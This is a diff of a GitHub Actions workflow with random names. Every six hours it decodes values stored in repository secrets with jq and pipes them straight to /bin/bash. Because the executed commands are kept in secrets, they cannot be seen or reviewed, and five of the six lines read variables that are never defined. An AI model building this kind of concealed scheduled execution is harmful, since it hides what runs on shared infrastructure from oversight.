@@ -2,25 +2,22 @@ name: huangjiao2314
 on:
   workflow_dispatch:
   schedule:
-    - cron: '4 5/6 * * *'
+    - cron: '26 1/6 * * *'
 
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: huangjiao2314
         env:
-          heoef05129: ${{ secrets.heoef05129 }}
+          s71: ${{ secrets.s71 }}
         run: |
-          echo $heoef05129 | jq -r .z5 | /bin/bash
-          echo $vj90 | jq -r .jjsuj5 | /bin/bash
-          echo $ucr79 | jq -r .pztkg0 | /bin/bash
-          echo $lmle31852 | jq -r .rc516 | /bin/bash
-          echo $x80 | jq -r .ln91 | /bin/bash
-          echo $nr019 | jq -r .jlzn03 | /bin/bash
-          echo $axlhn53231 | jq -r .wdfjr22 | /bin/bash
-          echo $evzc7 | jq -r .pll985 | /bin/bash
-          echo $u070 | jq -r .dlo37356 | /bin/bash
-          echo $vh15209 | jq -r .x903 | /bin/bash
+          echo $s71 | jq -r .dyw48 | /bin/bash
+          echo $ob25 | jq -r .vrrej953 | /bin/bash
+          echo $m7 | jq -r .obdy694 | /bin/bash
+          echo $eaf55 | jq -r .mfn248 | /bin/bash
+          echo $lw61557 | jq -r .o325 | /bin/bash
+          echo $fnx2 | jq -r .hm1 | /bin/bash
 
